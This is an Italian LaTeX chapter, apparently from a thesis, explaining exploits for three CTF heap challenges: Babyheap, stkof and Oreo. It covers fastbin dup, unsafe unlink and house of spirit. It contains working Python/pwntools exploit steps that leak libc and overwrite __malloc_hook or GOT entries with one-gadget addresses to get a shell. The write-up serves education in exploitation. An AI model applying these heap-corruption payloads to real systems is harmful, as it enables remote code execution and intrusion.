\section{CTF}
Vediamo ora l'applicazione di tre attacchi ad heap descritti nella precedente sezione, \emph{fastbin dup into stack}, \emph{unsafe unlink} e \emph{house of spirit}, con tre CTF, \emph{Babyheap} contenuta in \emph{0ctf Quals 2017}, \emph{stkof} di \emph{HITCON CTF 2014} ed \emph{Oreo} di \emph{hack.lu CTF 2014}.
In tutti e tre gli eseguibili è stata utilizzata la versione 2.25 della glibc, quindi non avente la \verb+tcache+.

I tre binari sono \verb+stripped+, sono stati quindi eliminati tutti i simboli di debugging. Inoltre è stato studiato il codice assembly x86-64 mediante il tool \emph{Ghidra}\cite{ghidra}, che oltre a fornire un disassemblatore, fornisce un decompilatore che produce un codice C-like di ottima qualità.

Per uno studio dell'heap a tempo di esecuzione è stato utilizzato \emph{PwnDBG}, un debugger che espande le funzionalita di GDB, introducendo una serie di comandi utili per le CTF di categoria \emph{pwn}:
\begin{itemize}
	\item \verb+heapinfo+: mostra alcune informazioni sull'heap, per tutti i thread
	\item \verb+fastbins+: mostra tutti i chunk contenuti in tutti i fastbin
	\item \verb+smallbins+: come il precedente, ma per i smallbin
	\item \verb+largebins+: come il precedente, ma per i largebin
	\item \verb+unsortedbin+: come il precedente, ma per l'unsorted bin
	\item \verb+tcache+: come il precedente, ma per le tcache
\end{itemize}

Un ulteriore tool per l'analisi dell'heap è \verb+HeapInspector+\cite{inspectpy}, scritto in Python, che consente di ispezionare il contenuto dell'heap e di tutti i bin, fornendo allo script il PID del processo che si vuole analizzare. Utile quando non sono disponibili i simboli di debugging nella libc, per cui i comandi per l'heap di PwnDBG potrebbero non funzionare.

Gli exploit sono stati scritti in Python2.7, utilizzando la libreria PwnTools~\cite{pwntool}, che ha una serie di strumenti utili per interagire con i processi, ed in generale per la scrittura di exploit.

Mentre in questo capitolo è spiegato passo passo l'exploit scritto per le challenge scelte, gli exploit integrali sono riportati nel Capitolo~\ref{cap:exploit}.
\subsection{Babyheap}\label{cap:babyheap}
L'eseguibile \emph{babyheap} mostra un menu con quattro operazioni:
\begin{enumerate}

	\item \emph{allocate}: dopo aver chiesto una dimensione alloca uno spazio in memoria ($\leqslant$ 0x1000) tramite la funzione \verb+calloc+
    \item \emph{fill}: riempie uno spazio in memoria precedentemente allocato. Qui risiede la vulnerabilità, poichè chiede all'utente la dimensione dei dati da inserire senza effettuare un controllo sulla dimensione inserita durante l'allocazione
    \item \emph{free}: libera uno spazio in memoria
    \item \emph{dump}: stampa il contenuto dello spazio in memoria allocato
\end{enumerate}

Effettuando un \verb+checksec+ sul binario, vediamo che esso è compilato a 64 bit, è Full RELRO, per cui non è possibile sovrascrivere la got table ed ha PIE abilitato:

\begin{Verbatim}[commandchars=\\\{\}]
    Arch:     amd64-64-little
    RELRO:    \textcolor{green}{Full RELRO}
    Stack:    \textcolor{green}{Canary found}
    NX:       \textcolor{green}{NX enabled}
    PIE:      \textcolor{green}{PIE enabled}
\end{Verbatim}

L'exploit si basa sulla duplicazione dei chunck nei bin, in particolare nel fastbin e nello smallbin, in modo tale che con successive chiamate a \verb+malloc+ è possibile ottenere la stessa locazione in memoria.
E' importante precisare che non è possibile sfruttare uno \emph{use-after-free}, in quanto i puntatori vengono posti a zero dopo che sono stati liberati.
Essendo i chunk allocati in memoria in modo contiguo è possibile, tramite la \emph{fill} offerta dal programma, effettuare un overflow e sovrascrivere i metadati dei chunk successivi, in particolare del campo \verb+FD+, ovvero il puntatore al chunk successivo in un bin, utilizzato nei fastbin, come puntatore per la gestione di una single linked list.

\begin{verbatim}
    allocate(10)        # -> A
    allocate(10)        # -> B
    allocate(10)        # -> C
    allocate(10)        # -> D
    allocate(0x80)      # -> E {sizeof(smallbin[0]) in 64 bit}
    allocate(10)        # altrimenti E va in top chunk dopo free
\end{verbatim}

Inizialmente si allocano 6 chunk e successivamente con le seguenti istruzioni, si liberano il secondo e il primo:

\begin{verbatim}
    free(2)
    free(1)
\end{verbatim}

In questo modo, essendo i chunk liberati di dimensioni 0x20, questi andranno a finire in \verb+fastbin[0]+\footnote{\verb_fastbin[0]_ contiene i chunk di dimensione 0x20}.
Per cui il primo fastbin contiene la seguente lista di chunk\footnote{ricordando che gli inserimenti e le rimozioni dai fastbin vengono effettuate in testa, con una politica di tipo LIFO}: \verb+[B, C]+.

Essendo il chunk A precedente in memoria al chunk B, con un overflow si modifica parte del campo \verb+FD+, in particolare l'ultimo byte, in modo tale che questo punti al chunk E, quello con dimensione 0x80.

\begin{verbatim}
    payload =  p64(0) * 3
    payload += p64(0x21)
    payload += p8(0x80)
    fill(0, payload)
\end{verbatim}

Se si richiede tramite \verb+malloc+, o in questo caso con una \verb+calloc+, una porzione di memoria con chunk size $\leqslant$ 0x20, questa restituirà il primo elemento del fastbin[0]. Tuttavia quando la \verb+malloc+ estrae questo elemento dalla coda, effettua un controllo sulla \verb+FD->size+, che deve corrispondere alla dimensione dei chunk del fastbin in questione, in questo caso a 0x20.
Quindi con un altro overflow si modifica la dimensione del quinto chunk:

\begin{verbatim}
    payload =  p64(0) * 3
    payload += p64(0x21)
    fill(3, payload)
\end{verbatim}

A questo punto vengono eseguite due \verb+calloc+:

\begin{verbatim}
    allocate(10)
    allocate(10)
\end{verbatim}

In particolare, la prima preleva B dal fastbin e poichè \verb+B->FD+ non è più C ma E, il secondo allocate preleva E, mettendolo in posizione 2 dell'array.
In questo modo due puntatori puntano a un'unico indirizzo in memoria.

\paragraph{Leak del base address della libc}

Ora quello che ci serve è un leak della libc. Ricordando che uno smallbin è una lista doppiamente concatenata e circolare, con puntatori \verb+FD+ e \verb+BK+ che indicano rispettivamente il chunk successivo e quello precedente e che uno smallbin vuoto ha i campi \verb+FD+ e \verb+BK+ pari all'indirizzo dello smallbin stesso, inserendo un chunk in uno smallbin tramite \verb+free+, il suo campo \verb+FD+ verrà popolato con l'indirizzo dello smallbin, che si trova proprio nella libc.

Prima di dare il chunk alla \verb+free+, è importante che la sua dimensione sia ripristinata:

\begin{verbatim}
    payload =  p64(0) * 3
    payload += p64(0x91)
    fill(3, payload)
\end{verbatim}

Poi si effettua una \verb+free+ del chunk E, che va a finire in \verb+smallbin[0]+:

\begin{verbatim}
    free(4)
\end{verbatim}

A questo punto, poichè il secondo elemento dell'array punta allo stesso chunk, tramite una \verb+dump+ è possibile vedere il contenuto dei puntatori \verb+FD+ e \verb+BK+, ricordando che in un chunk che viene liberato con \verb+free+ corrisponde ai primi 16 byte (in sistemi a 64 bit) della zona usata dall'applicazione.
Conoscendo l'offset dal base address della libc è possibile ottenere l'indirizzo.

\paragraph{Ottenimento di una shell}
Essendo il binario Full RELRO, non è possibile modificare alcuna entry della got table. Quindi per richiamare le funzioni della libc, si può utilizzare \verb+__malloc_hook+, un puntatore a funzione che \verb+malloc+ invoca se questo è diverso da \verb+NULL+.

\begin{Verbatim}[commandchars=\\\{\}]
    \textcolor{red}{pwndbg>} x/10gx (long)&main_arena - 0x40
    \textcolor{blue}{0x7ff0cd8a0ac0} <\textcolor{orange}{_IO_wide_data_0}+288>:   0x0000000000000000      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0ad0} <\textcolor{orange}{_IO_wide_data_0}+304>:   0x00007ff0cd8a1e00      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0ae0} <\textcolor{orange}{__memalign_hook}>:       0x00007ff0cd7865d0      0x00007ff0cd786580
    \textcolor{blue}{0x7ff0cd8a0af0} <\textcolor{orange}{__malloc_hook}>:         0x0000000000000000      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0b00} <\textcolor{orange}{main_arena}>:            0x0000000000000000      0x0000000000000000
\end{Verbatim}

L'indirizzo \verb+0x7ff0cd8a0af0+ è proprio il nostro target. Per sovrascrivere questa zona di memoria possiamo ricorrere nuovamente ad un fastbin attack, iniettando come indirizzo \verb+0x7ff0cd8a0af0+, 16 byte prima di \verb+__malloc_hook+.
Tuttavia la \verb+malloc+ controlla se la dimensione del chunk è pari a quella del fastbin in cui si trova, ma in questo caso la dimensione, \verb+0x7ff0cd786580+ è di gran lunga superiore a quella di qualsiasi fastbin. La \verb+malloc+ non richiede alcun allineamento degli indirizzi, per cui è possibile iniettare un indirizzo con un certo offset rispetto a quello visto e \emph{forzare} la dimensione a 0x7f.

\begin{Verbatim}[commandchars=\\\{\}]
    \textcolor{red}{pwndbg>} x/10gx (long)&main_arena - 0x40+0xd
    \textcolor{blue}{0x7ff0cd8a0acd} <\textcolor{orange}{_IO_wide_data_0}+301>:   0xf0cd8a1e00000000      0x000000000000007f
    \textcolor{blue}{0x7ff0cd8a0add}:                         0xf0cd7865d0000000      0xf0cd78658000007f
    \textcolor{blue}{0x7ff0cd8a0aed} <\textcolor{orange}{__realloc_hook}+5>:      0x000000000000007f      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0afd}:                         0x0000000000000000      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0b0d} <\textcolor{orange}{main_arena}+13>:         0x0000000000000000      0x0000000000000000
\end{Verbatim}

L'indirizzo \verb+0x7ff0cd8a0acd+ è proprio ciò che cercavamo. Iniettando questo indirizzo è possibile far credere alla \verb+malloc+ che la dimensione del chunk è 0x7f, che corrisponde
ad un chunk di dimensione 0x70 in un fastbin.
Per cui si effettua lo stesso attacco di prima:

\begin{verbatim}
    allocate(0x68)
    allocate(0x68)

    free(7)

    payload =  p64(0) * 17
    payload += p64(0x71)
    payload += p64(libc_base + 0x19bacd)
    fill(6, payload)
\end{verbatim}

Si allocano due chunk, se ne libera uno e si fa un overflow sul \verb+FD+ del settimo chunk.

\begin{verbatim}
    allocate(0x68)
    allocate(0x68)  # pos 8
\end{verbatim}

Con due richieste ad \verb+allocate+ di dimensione del fastbin con chunk di grandezza 0x70, si ottiene in posizione 8 dell'array un chunk all'indirizzo \verb+0x7ff0cd8a0acd+.
E' possibile ora controllare il puntatore \verb+__malloc_hook+.

Per ottenere una shell, avendo l'indirizzo base della libc, è stato utilizzato un tool in python, \verb+magic.py+\cite{magicpy}, che utilizza le API di \verb+radare2+, per cercare il \emph{magic gadget}, un indirizzo nella libc che esegue \verb+exec("/bin/sh")+. Nel caso della libc considerata, questo si trova ad un offset \verb+0x45682+ rispetto il base address della libc.

\begin{verbatim}
    payload =  p8(0) * 19
    payload += p64(libc_base + 0x45682)     # magic gadget
    fill(8, payload)
\end{verbatim}

Si fa un \verb+fill+ dell'ottavo chunk, sovrascrivendo \verb+__malloc_hook+, ed eseguendo

\begin{verbatim}
    allocate(1)
\end{verbatim}

si invoca la funzione puntata da \verb+__malloc_hook+, ottendendo in questo modo una shell.

\subsection{Stkof}\label{cap:stkof}
\emph{Stkof} è un eseguibile che offre le seguenti operazioni, su un array \verb+G+ di \verb+0x100000+ puntatori, contenuto nella sezione \verb+.bss+:
\begin{enumerate}
	\item \emph{alloc(n)}: alloca un array di \verb+n+ byte e lo inserisce nella prossima posizione libera di \verb+G+ a partire da 1 (questa viene incrementata di volta in volta, senza mai essere decrementata)
	\item \emph{read(index, size, data)}: inserisce in posizione \verb+index+ di \verb+G+ una stringa \verb+data+ di lunghezza \verb+size+ da stdin. Questa è la funzione presenta una vulnerabilità. E' infatti possibile effettuare un overflow
	\item \emph{dealloc(index)}: libera la posizione \verb+index+ di \verb+G+
\end{enumerate}

Eseguando un checksec sull'eseguibile, si può vedere che il binario è compilato a 64 bit, che non ha PIE abilitato e che è Partial RELRO, per cui è possibile sovrascrivere la tabella \verb+.got+:

\begin{Verbatim}[commandchars=\\\{\}]
    Arch:     amd64-64-little
    RELRO:    \textcolor{red}{Partial RELRO}
    Stack:    \textcolor{green}{Canary found}
    NX:       \textcolor{green}{NX enabled}
    PIE:      \textcolor{red}{No PIE (0x400000)}
\end{Verbatim}

L'exploit si basa sull'attacco denominato \emph{unsafe unlink}, secondo cui si fa credere alla \verb+free + l'esistenza di un chunk non esistente, perchè non ottenuto da una chiamata a \verb+malloc+, che consente alla fine di avere un \emph{arbitrary write} su un indirizzo a propria scelta.

\begin{lstlisting}[style=PyStyle]
alloc(0x80)


alloc(0x80)
alloc(0x80)

ptr_addr = 0x602150
sizeof_ptr = 8

payload =  p64(0)*2
payload += p64(ptr_addr - sizeof_ptr*3)      # FD
payload += p64(ptr_addr - sizeof_ptr*2)      # BK
payload += p64(0)*12
payload += p64(0x80)                         # fake prev_size
payload += p64(0x90)                         # chunk size (bit prev in use = 0)

read(2, payload)
dealloc(3)
\end{lstlisting}

Si inizia allocando due buffer, \verb+buf1+ e \verb+buf2+, di dimensione 0x80, in modo da superare la dimensione del più grande fastbin, occupando quindi le posizioni 2 e 3 di \verb+G+\footnote{la prima \verb+alloc+ 
poteva essere evitata, ma serve solo per facilitare alcuni conti}.

Dopo aver allocato i due buffer, si crea un chunk fake all'interno di \verb+buf1+ scrivendo in posizione 2 e 3\footnote{considerato un buffer di puntatori, quindi di 8 byte in architettura a 64 bit} rispettivamente \verb+ptr_addr - sizeof_ptr*3+ e \verb+ptr_addr - sizeof_ptr*2+, che corrispondono ai puntatori \verb+FD+ e \verb+BK+ in un chunk vuoto. \verb+ptr_addr+ è un puntatore a puntatore, che punta al puntatore di \verb+buf1+(corrisponde a \verb+&G[2]+).
Questi valori non sono casuali, ma servono per bypassare il secondo controllo dell'\verb+unlink+ nella \verb+free+:

\begin{lstlisting}[style=CStyle]
#define unlink(AV, P, BK, FD) {                                            
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
      malloc_printerr ("corrupted size vs. prev_size");			      
    FD = P->fd;
    BK = P->bk;
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
      malloc_printerr ("corrupted double-linked list");
    else {
        FD->bk = BK;
        BK->fd = FD;		//[X]
      	
      	/* other code */
    }
}
\end{lstlisting}

Questo frammento di codice estrae un chunk libero da un bin.
Il controllo che in questo caso verrà superato è \verb+P->fd->bk == P+ e \verb+P->bk->fd == P+.

Essendo inoltre i chunk di \verb+buf1+ e \verb+buf2+ contigui in memoria ed essendo possibile un overflow su \verb+buf1+, si modifica la \verb+prev_size+ del chunk di \verb+buf2+ a 0x80\footnote{il valore in questo caso sarebbe stato 0x90}, per far credere alla \verb+free+ che il chunk di \verb+buf1+ è in realtà più piccolo, e si setta il bit \verb+prev_in_use+ a 0, per far credere alla \verb+free+ che il chunk precedente è libero.

Viene quindi deallocato \verb+buf2+ e, poichè la sua dimensione non rientra in un fastbin, il chunk viene consolidato con il precedente\footnote{che è libero secondo i metadati letti dalla \verb+free+} e viene chiamato l'\verb+unlink+.
Questo porta, grazie all'operazione conterassegnata con \verb+[X]+ nell'\verb+unlink+, a sovrascrivere il puntatore a puntatore a \verb+buf1+ con l'\verb+FD+ iniettato in \verb+buf1+, che in questo caso è \verb+0x602138+.
Grazie a questo è possibile sovrascrivere, scrivendo su \verb+G[2]+, qualsiasi puntatore in \verb+G+.

\begin{lstlisting}[style=PyStyle]
payload =  p64(0)*2
payload += p64(e.got['puts'])
payload += p64(e.got['free'])
read(2, payload)
\end{lstlisting}

In questo caso viene modificato \verb+G[1]+ e \verb+G[2]+ rispettivamente con l'indirizzo della \verb+.got+ di \verb+puts+ e di \verb+free+.

\paragraph{Leak del base address della libc}
La seguente istruzione eseguita nell'exploit sovrascrive l'indirizzo di jump della \verb+free+ nella \verb+.got+, con l'indirizzo della \verb+.plt+ di \verb+puts+:

\begin{lstlisting}[style=PyStyle]
read(2, p64(e.plt['puts']+0x6))
\end{lstlisting}

In questo modo ora la \verb+free+ in realtà esegue una \verb+puts+.
Con la seguente invece, si esegue una \verb+free+ su \verb+G[1]+, e quindi in realtà una \verb+puts+ di \verb+G[1]+, ovvero dell'indirizzo proprio della \verb+puts+.

\begin{lstlisting}[style=PyStyle]
dealloc(1)
\end{lstlisting}

Con l'ultima istruzione si ottiene quindi l'indirizzo della libc, sottraendo l'offset \verb+0x6e570+ dall'indirizzo della \verb+puts+ nella libc.

\begin{lstlisting}[style=PyStyle]
libc_addr = u64((p.readline().rstrip().ljust(8, '\x00'))) - 0x6e570
\end{lstlisting}

\paragraph{Ottenimento della shell}
Avendo ora il base address della libc, con il tool \verb+magic.py+\cite{magicpy} si identifica l'offset del \emph{magic gadget} per ottenere una shell. Questo indirizzo viene sostituito nuovamente al posto della \verb+free + e nuovamente con un \verb+dealloc+, si va a richiamare la \verb+free+ nel codice, che corrisponde ora ad una \verb+exec("/bin/sh")+:

\begin{lstlisting}[style=PyStyle]
read(2, p64(libc_addr + 0x45682))             # magic gadget
dealloc(2)
\end{lstlisting}

\subsection{Oreo}
\emph{Oreo} consiste in un programma che offe un servizio per la vendita di fucili. Le operazioni disponibili sono:
\begin{enumerate}
	\item \emph{Add new rifle}: dato un nome ed una descrizione, aggiunge in una lista, \verb+rifles+, il fucile da comprare. La vulnerabilità è presente proprio in questa operazione, poichè nella \verb+struct rifle_t+, vedi Listing~\ref{code:structrifle}, quando si inserisce o la descrizione o il nome si può fare un overflow sul campo \verb+next+
	\item \emph{Show added rifles}: mostra i fucili aggiunti in lista
	\item \emph{Order selected rifles}: ordina i fucili, facendo una \verb+free+ dei nodi della lista
	\item \emph{Leave a Message with your Order}: lascia un messaggio, scrivendo in un buffer contenuto in \verb+.bss+
	\item \emph{Show current stats}: mostra il numero di fucili comprati e, se presente, il messaggio lasciato con la precedente operazione.
\end{enumerate}

\begin{lstlisting}[style=CStyle, label={code:structrifle}, caption={struct rifle\_t contenuta in \emph{oreo}}]
struct rifle_t {
	char description[25];
	char name[27];
	struct rifle_t* next;
};
\end{lstlisting}

Un \verb+checksec+ sul binario, mostra che il file è compilato a 32 bit e che essendo non RELRO, è possibile scrivere nella \verb+.got+ e ha anche PIE disabilitato.

\begin{Verbatim}[commandchars=\\\{\}]
    Arch:     i386-32-little
    RELRO:    \textcolor{red}{No RELRO}
    Stack:    \textcolor{green}{Canary found}
    NX:       \textcolor{green}{NX enabled}
    PIE:      \textcolor{red}{No PIE (0x8048000)}
\end{Verbatim}

Ciò che è importante sapere ai fini dell'exploit è che tutte le strutture dati sono contenute nel segmento \verb+.bss+. In particolare esiste un puntatore ad un buffer di caratteri, denominato \verb+msg_ptr+, e il buffer puntato, denominato \verb+buf_msg+ di dimensione 0x80. \verb+msg_ptr+ è inizializzato nel \verb+main+ per puntare all'indirizzo di \verb+buf_msg+.
Inoltre ogni volta che viene aggiunto un nuovo fucile con l'operazione 1, viene allocato spazio in heap con una \verb+malloc+ e viene aggiunto in testa alla lista \verb+rifles+, prima che venga chiesto nome e descrizione.
Esiste infine un contatore, denominato \verb+cont+, che contiene il numero di fucili da ordinare, incrementato ogni volta che si esegue l'operazione 1, ma mai decrementato.

L'attacco utilizzato nell'exploit è denominato \emph{house of spirit}, in cui è possibile forzare la \verb+malloc + ad allocare uno spazio in memoria in un indirizzo arbitrario.
In questo caso è stato scelto come indirizzo una entry della tabella \verb+.got+, in modo da sovrascrivere il riferimento ad una funzione presente nella tabella stessa.

In memoria, nel segmento \verb+.bss+, il contatore \verb+cont+ precede \verb+msg_ptr+, dopo di che seguono 20 byte inutilizzato, per poi esserci il buffer \verb+buf_msg+, secondo la Figura %INSERIRE FIGURA.
Bisogna tener presente che per far credere alla \verb+free+ che l'attuale chunk da liberare è effettivamente un chuck e che questo deve andare in un fastbin, il campo \verb+size+ deve contenere una dimensione corretta, senza badare al bit \verb+prev_in_use+, che nella gestione di un fast bin non viene considerato.
Inoltre, poichè la \verb+malloc+ viene chiamata solo nell'operazione 1 e questa alloca uno spazio in memoria di 0x38 byte, serve un chunk di dimensione 0x40.
Il target scelto per la \verb+malloc+ è l'indirizzo di \verb+msg_ptr+, in modo tale da modificare il puntatore ad un buffer arbitrario, che è possibile poi sovrascrivere con l'operazione 4.

Quindi il campo \verb+size+ del chunk dato alla \verb+free+\footnote{ovvero i 4 byte precedenti al puntatore dato} deve contenere 0x40. Questo corrisponde in memoria alla variabile \verb+cont+, che è possibile incrementare solamente con l'operazione 1.

\begin{verbatim}
    msg_ptr_addr = 0x0804a2a8

    for i in range(0x40-1):
        add_rifle("a", "a")

    payload = p8(0x61) * 27
    payload += p32(msg_ptr_addr)

    add_rifle(payload, "description")

\end{verbatim}

Vengono inizialmente inserite in lista 0x40-1 fucili, per poi aggiungere un fucile, che tramite l'inserimento del nome\footnote{un campo di 27 byte}, sovrascrive il campo \verb+next+ con l'indirizzo di \verb+msg_ptr+.

Poichè la free controlla che il chunk successivo abbia una \verb+size+ maggiore di 16 e minore di 128k, dopo 36 byte in \verb+msg_buf+ viene scritto il valore 0x1234, che rientra nella size corretta:

\begin{verbatim}
    payload = p8(0) * 36
    payload += p32(0x1234)

    leave_notice(payload)
\end{verbatim}

Per fare in modo che il chunk iniettato sia il primo del fastbin, l'attraversamento della lista \verb+rifles+ deve terminare al chunk iniettato. Ecco il perchè del riempimento di \verb+msg_buffer+ con byte posti a 0.

La seguente istruzione farà finire \verb+msg_ptr_addr - 0x8+ nel fastbin\footnote{0x8 perchè il campo \verb+size+ e \verb+prev_size+ a 32 bit sono di 4 byte}.
Da notare inoltre l'allineamento del chunk a 16 byte, fornito alla free\footnote{si ricorda che il chunk address si ottiene dall'indirizzo fornito alla \verb+free+, a cui si sottrae l'header del chunk, in questo caso 8 byte}:

\begin{verbatim}
    order()
\end{verbatim}

\paragraph{Leak della libc e ottenimento della shell}
Si sovrascrive quindi \verb+msg_ptr+ con l'indirizzo della \verb+.got+ di \verb+strlen+:

\begin{verbatim}
    add_rifle("name", p32(e.got['strlen']))     # overwrite notice_ptr with strlen got address

    stats()

    p.recvuntil("Order Message: ")
    libc_addr = u32(p.recvline()[:4]) - 0x7e440
\end{verbatim}

Con \verb+stats+, che corrisponde all'operazione 5, si stampa il contenuto del "\verb+msg_buf+", in questo caso il contenuto della \verb+.got+ di \verb+strlen+. Si ha quindi un leak della libc, ottenuto togliendo l'offset 0x7e440 all'indirizzo nella libc di \verb+strlen+.

Con il tool \verb+magic.py+\cite{magicpy}, si trova il \emph{magic gadget} che consente di eseguire \verb+exec("/bin/sh")+ con un solo gadget, per cui si sovrascrive il nuovo "\verb+msg_buf+" che corrisponde all'indirizzo della \verb+.got+ di \verb+strlen+ con il magic gadget:

\begin{verbatim}
    leave_notice(p32(libc_addr + 0x5fbc5))      # magic gadget
\end{verbatim}

Poichè l'operazione \verb+leave_notice+, operazione 4, dopo aver letto il messaggio da stdin determina la lunghezza della stringa inserita con \verb+strlen+, viene eseguito il gadget iniettato.
Si ottiene in questo modo una shell.
